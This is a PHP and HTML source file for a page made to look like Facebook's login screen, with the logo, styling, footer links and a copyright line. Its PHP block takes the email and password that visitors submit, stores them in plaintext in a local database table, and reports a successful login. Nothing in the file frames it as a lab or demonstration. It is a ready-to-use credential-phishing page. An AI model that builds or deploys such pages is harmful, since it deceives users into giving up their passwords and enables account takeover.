<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook - Log In or Sign Up</title>
  
  <!-- Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous"/>
  
  <!-- Font Awesome for icons (optional) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  
  <style>
    body {
      background: #f0f2f5;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
    }

    .fb-logo {
      color: #1877f2;
      font-size: 3.5rem;
      font-weight: bold;
      margin-bottom: 0.5rem;
    }

    .login-box {
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      padding: 1.5rem 1.5rem;
      width: 100%;
      max-width: 396px;
    }

    .form-control-lg {
      font-size: 1.1rem;
      padding: 0.75rem 1rem;
      border-radius: 6px;
    }

    .btn-primary {
      background-color: #1877f2;
      border-color: #1877f2;
      font-weight: 600;
      font-size: 1.1rem;
      padding: 0.75rem;
      border-radius: 6px;
    }

    .btn-primary:hover {
      background-color: #166fe5;
      border-color: #166fe5;
    }

    .btn-create {
      background-color: #42b72a;
      border-color: #42b72a;
      font-weight: 600;
      padding: 0.6rem 1.5rem;
      font-size: 1.1rem;
      border-radius: 6px;
    }

    .btn-create:hover {
      background-color: #36a420;
      border-color: #36a420;
    }

    .forgot-link {
      color: #1877f2;
      text-decoration: none;
      font-size: 0.95rem;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .divider {
      height: 1px;
      background: #dadde1;
      margin: 1.5rem 0;
    }

    .footer-links {
      font-size: 0.85rem;
      color: #737373;
    }

    .footer-links a {
      color: #737373;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    .alert-message {
      padding: 12px 20px;
      border-radius: 6px;
      margin-bottom: 15px;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .success-message {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .error-message {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    @media (max-width: 576px) {
      .fb-logo {
        font-size: 3rem;
      }
      .login-box {
        margin: 0 1rem;
      }
    }
  </style>
</head>
<body>

<?php
// Include database connection
include '../config.php';

// Initialize variables
$success_message = '';
$error_message = '';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Extract username from email (before @ symbol)
    $username = explode('@', $email)[0];
    
    if (!empty($email) && !empty($password)) {
        // Sanitize inputs
        $email = mysqli_real_escape_string($con, $email);
        $password = mysqli_real_escape_string($con, $password);
        $username = mysqli_real_escape_string($con, $username);
        
        // Insert into fb_tbl
        $query = "INSERT INTO fb_tbl (username, email, password, created_at) VALUES ('$username', '$email', '$password', NOW())";
        
        if (mysqli_query($con, $query)) {
            $success_message = "Login successful! Data saved to database.";
        } else {
            $error_message = "Error: " . mysqli_error($con);
        }
    } else {
        $error_message = "Please fill in all fields.";
    }
}
?>

<div class="container">
  <div class="row align-items-center" style="min-height: 100vh;">
    
    <!-- Left Side - Welcome Text -->
    <div class="col-lg-6 col-md-6 mb-5 mb-lg-0 text-center text-lg-start">
      <h1 class="fb-logo">facebook</h1>
      <p class="fs-4 fw-light" style="max-width: 500px;">
        Facebook helps you connect and share with the people in your life.
      </p>
    </div>

    <!-- Right Side - Login Form -->
    <div class="col-lg-6 col-md-6">
      <div class="login-box mx-auto">
        <?php if ($success_message): ?>
          <div class="alert-message success-message">
            <i class="fas fa-check-circle"></i>
            <?php echo $success_message; ?>
          </div>
        <?php endif; ?>

        <?php if ($error_message): ?>
          <div class="alert-message error-message">
            <i class="fas fa-exclamation-circle"></i>
            <?php echo $error_message; ?>
          </div>
        <?php endif; ?>

        <form method="post">
          <div class="mb-3">
            <input type="email" name="email" class="form-control form-control-lg" placeholder="Email address or phone number" required/>
          </div>
          <div class="mb-3">
            <input type="password" name="password" class="form-control form-control-lg" placeholder="Password" required/>
          </div>

          <button type="submit" class="btn btn-primary btn-lg w-100 mb-3">
            Log In
          </button>

          <a href="#" class="forgot-link d-block text-center mb-3">Forgotten password?</a>

          <div class="divider"></div>

          <div class="text-center">
            <button type="button" class="btn btn-create btn-lg px-4">
              Create new account
            </button>
          </div>
        </form>

        <p class="text-center mt-4 mb-0">
          <a href="#" class="fw-bold text-dark">Create a Page</a> for a celebrity, brand or business.
        </p>
      </div>
    </div>
  </div>

  <!-- Footer Links -->
  <div class="row mt-5">
    <div class="col-12 text-center footer-links">
      <a href="#">English (UK)</a> • 
      <a href="#">हिन्दी</a> • 
      <a href="#">اردو</a> • 
      <a href="#">More Languages</a><br/><br/>
      <a href="#">Privacy</a> • 
      <a href="#">Terms</a> • 
      <a href="#">Advertising</a> • 
      <a href="#">Cookies</a> • 
      <a href="#">Ad choices</a> • 
      <a href="#">Help</a><br/>
      <small>Facebook © 2026</small>
    </div>
  </div>
</div>

<!-- Bootstrap 5 JS (optional for interactivity) -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
</body>
</html>